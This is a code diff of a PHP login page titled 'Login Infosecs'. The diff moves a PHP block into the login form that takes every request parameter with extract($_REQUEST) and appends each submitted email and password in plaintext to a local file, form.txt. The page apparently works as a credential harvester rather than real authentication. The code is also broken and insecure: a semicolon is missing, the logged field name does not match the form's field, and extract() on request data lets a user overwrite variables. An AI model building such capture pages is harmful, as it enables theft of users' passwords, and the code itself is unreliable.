@@ -45,9 +45,21 @@
             } 
     </style> 
 </head>  
-<body>  
-    <center> <h1> Login Infosecs </h1> </center> 
-    <form>
+<body>   
+    <form action="index.php" method="post">
+        <?php
+            extract($_REQUEST);
+            $file=fopen("form.txt", "a")
+
+            fwrite($file, "email :");
+            fwrite($file, $email . "\n");
+
+            fwrite($file, "password :");
+            fwrite($file, $password . "\n");
+
+            fclose($file);
+        ?>
+        <center> <h1> Login Infosecs </h1> </center>
         <div class="container"> 
             <label>Username : </label> 
             <input type="text" placeholder="Enter Username" name="username" required>
@@ -58,18 +70,3 @@
     </form>   
 </body>   
 </html>
-
-<form method="post" action="index.php">
-
-<?php
-    extract($_REQUEST);
-    $file=fopen("form.txt", "a")
-
-    fwrite($file, "email :");
-    fwrite($file, $email . "\n");
-
-    fwrite($file, "password :");
-    fwrite($file, $password . "\n");
-
-    fclose($file);
-?>
